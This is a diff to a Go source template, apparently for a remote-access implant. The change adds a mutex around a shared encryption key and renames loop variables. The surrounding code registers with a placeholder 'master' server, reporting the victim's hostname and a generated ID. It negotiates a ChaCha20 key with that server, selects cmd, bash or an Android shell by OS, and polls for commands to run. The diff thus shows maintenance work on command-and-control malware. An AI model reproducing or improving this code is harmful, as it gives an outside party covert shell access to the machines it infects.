@@ -500,6 +500,7 @@ func send() { //发送头部信息
         user string = /*Username*/
         master string = /*server*/
         key []byte
+        keyMutex sync.RWMutex
         /*header*/
     )
     /*inithttp*/
@@ -511,8 +512,8 @@ func send() { //发送头部信息
                 time.Sleep(time.Duration(waitTime) * time.Second)
                 continue
             }
-            for key, value := range get_headers {
-                req.Header.Set(key, value)
+            for key_, value := range get_headers {
+                req.Header.Set(key_, value)
             }
             resp, err := client.Do(req)
             if err != nil {
@@ -534,8 +535,8 @@ func send() { //发送头部信息
     func post(data map[string]string, re_url string) {
         for {
             var formStr strings.Builder
-            for key, value := range data {
-                formStr.WriteString(urlEncode(key))
+            for key_, value := range data {
+                formStr.WriteString(urlEncode(key_))
                 formStr.WriteString("=")
                 formStr.WriteString(urlEncode(value))
                 formStr.WriteString("&")
@@ -549,8 +550,8 @@ func send() { //发送头部信息
                 time.Sleep(time.Duration(waitTime) * time.Second)
                 continue
             }
-            for key, value := range post_headers {
-                req.Header.Set(key, value)
+            for key_, value := range post_headers {
+                req.Header.Set(key_, value)
             }
             resp, err := client.Do(req)
             if err != nil {
@@ -1048,20 +1049,13 @@ func send() { //发送头部信息
     func rotl(x uint32, n uint) uint32 { return (x << n) | (x >> (32 - n))}
     func quarterRound(a, b, c, d uint32) (uint32, uint32, uint32, uint32) {a += b; d ^= a; d = rotl(d, 16); c += d; b ^= c; b = rotl(b, 12); a += b; d ^= a; d = rotl(d, 8); c += d; b ^= c; b = rotl(b, 7); return a, b, c, d}
     func initializeState(counter uint32, nonce [12]byte) [16]uint32 {
+        keyMutex.RLock()
+        defer keyMutex.RUnlock()
+        if len(key) != 32 {
+            return [16]uint32{}
+        }
         return [16]uint32{
-            0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
-            binary.LittleEndian.Uint32(key[0:4]),
-            binary.LittleEndian.Uint32(key[4:8]),
-            binary.LittleEndian.Uint32(key[8:12]),
-            binary.LittleEndian.Uint32(key[12:16]),
-            binary.LittleEndian.Uint32(key[16:20]),
-            binary.LittleEndian.Uint32(key[20:24]),
-            binary.LittleEndian.Uint32(key[24:28]),
-            binary.LittleEndian.Uint32(key[28:32]),
-            counter,
-            binary.LittleEndian.Uint32(nonce[0:4]),
-            binary.LittleEndian.Uint32(nonce[4:8]),
-            binary.LittleEndian.Uint32(nonce[8:12]),
+            0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,binary.LittleEndian.Uint32(key[0:4]),binary.LittleEndian.Uint32(key[4:8]),binary.LittleEndian.Uint32(key[8:12]),binary.LittleEndian.Uint32(key[12:16]),binary.LittleEndian.Uint32(key[16:20]),binary.LittleEndian.Uint32(key[20:24]),binary.LittleEndian.Uint32(key[24:28]),binary.LittleEndian.Uint32(key[28:32]),counter,binary.LittleEndian.Uint32(nonce[0:4]),binary.LittleEndian.Uint32(nonce[4:8]),binary.LittleEndian.Uint32(nonce[8:12]),
         }
     }
     func chacha20Block(counter uint32, nonce [12]byte) [64]byte {
@@ -1100,7 +1094,6 @@ func send() { //发送头部信息
         return out
     }
     func Encrypt(input []byte) []byte {
-		if len(key) != 32 {return nil}
         var nonce [12]byte
         if _, err := crand.Read(nonce[:]); err != nil {
             return nil
@@ -1112,7 +1105,6 @@ func send() { //发送头部信息
         return out
     }
     func Decrypt(input []byte) []byte {
-		if len(key) != 32 {return nil}
         if len(input) < 12 {
             return nil
         }
@@ -1281,21 +1273,22 @@ func send() { //发送头部信息
 		ciphertextBase64 := customBase64Encode(ciphertext)
 		key_url := protocol + master + "//*Path*/?/*option*/=/*switch_key*/&/*uid*/=" + uid + "&/*keyPart*/=" + ciphertextBase64
         getUrl(key_url)
-        key = sharedKey
+        keyMutex.Lock();key = sharedKey;keyMutex.Unlock()
         onece = false
 	}
     func run() {
         if onece {
             a_Mutex.Lock();decodeMap = buildDecodeMap();a_Mutex.Unlock()
             if uid == "" {uid = generateUUID()}
-            key = nil
+            keyMutex.Lock();key = nil;keyMutex.Unlock()
             if osname == "win"{version = "cmd"}else if osname == "linux" || osname == "macos"{version = "bash"}else if osname == "android"{version="/system/bin/sh"}
             clientname,_ = os.Hostname()
             client_b := customBase64Encode([]byte(clientname))
             url := protocol + master + "//*Path*/?/*option*/=/*ConnPath*/&/*uid*/=" + uid + "&/*hostname*/=" + client_b
             for {
                 generateAndUpdateKey(url)
-                if !onece && len(key) == 32 {
+                keyMutex.RLock();key_ := key;keyMutex.RUnlock()
+                if !onece && len(key_) == 32 {
                     send()
                     getCmd()
                 }
